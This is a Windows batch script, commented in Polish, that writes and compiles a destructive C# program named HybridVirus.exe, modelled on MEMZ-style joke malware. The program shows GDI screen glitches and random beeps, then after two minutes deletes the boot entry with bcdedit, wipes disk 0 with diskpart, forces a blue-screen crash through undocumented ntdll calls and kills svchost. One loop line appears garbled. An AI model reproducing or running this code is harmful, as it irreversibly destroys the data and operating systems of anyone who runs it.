@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] BLAD: Musisz uruchomic ten plik jako ADMINISTRATOR.
    pause
    exit
)

title HYBRID VIRUS COMPILER (MEMZ + SAILEWIN)
color 0C

:: Lokalizacja robocza
set "workDir=%userprofile%\Desktop\lol-main"
if not exist "%workDir%" mkdir "%workDir%"
cd /d "%workDir%"

echo [*] Generowanie kodu zrodlowego C#...

(
echo using System;
echo using System.Drawing;
echo using System.Runtime.InteropServices;
echo using System.Threading;
echo using System.Windows.Forms;
echo using System.Diagnostics;
echo using Microsoft.Win32;
echo.
echo public class FinalVirus {
echo     [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr h^);
echo     [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hD, int x, int y, int w, int h, IntPtr hS, int sx, int sy, uint op^);
echo     [DllImport("user32.dll")] public static extern int GetSystemMetrics(int n^);
echo     [DllImport("ntdll.dll")] public static extern uint RtlAdjustPrivilege(int p, bool e, bool c, out bool o^);
echo     [DllImport("ntdll.dll")] public static extern uint NtRaiseHardError(uint h, uint a, uint b, IntPtr c, uint d, out uint e^);
echo.
echo     [STAThread]
echo     public static void Main(^) {
echo         // 1. OSTRZEZENIE (Opcjonalne - mozesz usunac te 2 linie, zeby startowal od razu)
echo         if (MessageBox.Show("URUCHOMIC HYBRYDE? SYSTEM ZOSTANIE ZNISZCZONY.", "ALARM", MessageBoxButtons.YesNo^) == DialogResult.No^) return;
echo.
echo         // 2. PAYLOADY (Dzwiek i GDI)
echo         new Thread(PayloadGDI^).Start(^);
echo         new Thread(PayloadAudio^).Start(^);
echo.
echo         // 3. CZAS DO AUTODESTRUKCJI (120 sekund)
echo         Thread.Sleep(120000^);
echo.
echo         // 4. KILL SYSTEM (UEFI/MBR/REGISTRY)
echo         Destruction(^);
echo     }
echo.
echo     static void PayloadGDI(^) {
echo         IntPtr hdc = GetDC(IntPtr.Zero^);
echo         int w = GetSystemMetrics(0^), h = GetSystemMetrics(1^);
echo         Random r = new Random(^);
echo         while(true^ step^) {
echo             BitBlt(hdc, r.Next(-10, 11^), r.Next(-10, 11^), w, h, hdc, 0, 0, 0x00CC0020^); // Shake
echo             if(r.Next(100^) ^> 95^) BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00660046^); // Invert
echo             if(r.Next(10^) ^> 8^) Graphics.FromHdc(hdc^).DrawIcon(SystemIcons.Error, r.Next(w^), r.Next(h^)^); // Errors
echo             Thread.Sleep(15^);
echo         }
echo     }
echo.
echo     static void PayloadAudio(^) {
echo         Random r = new Random(^);
echo         while(true^) { Console.Beep(r.Next(200, 2000^), 100^); Thread.Sleep(r.Next(500, 2000^)^); }
echo     }
echo.
echo     static void Destruction(^) {
echo         try {
echo             // Usuniecie wpisu rozruchowego (Niszczenie sciezki do systemu)
echo             Process.Start(new ProcessStartInfo("bcdedit", "/delete {current} /f"^) { WindowStyle = ProcessWindowStyle.Hidden }^);
echo.
echo             // Czyszczenie partycji (Diskpart)
echo             string s = "select disk 0\nclean";
echo             System.IO.File.WriteAllText("s.txt", s^);
echo             Process.Start(new ProcessStartInfo("diskpart", "/s s.txt"^) { WindowStyle = ProcessWindowStyle.Hidden }^);
echo.
echo             // Wywolanie BSOD (Critical Error)
echo             bool o; uint e;
echo             RtlAdjustPrivilege(19, true, false, out o^);
echo             NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out e^);
echo         } catch { Process.Start("cmd.exe", "/c taskkill /f /im svchost.exe"^); }
echo     }
echo }
) > source.cs

echo [*] Szukanie kompilatora w systemie...
set "csc=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%csc%" set "csc=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"

echo [*] Kompilacja Hybrydy...
"%csc%" /target:winexe /out:HybridVirus.exe /r:System.Windows.Forms.dll /r:System.Drawing.dll /r:System.dll source.cs

if %errorLevel% equ 0 (
    echo.
    echo [+] GOTOWE! Plik HybridVirus.exe znajduje sie w lol-main.
    echo [+] Plik source.cs mozesz usunac.
) else (
    echo [!] BLAD KOMPILACJI.
)
pause
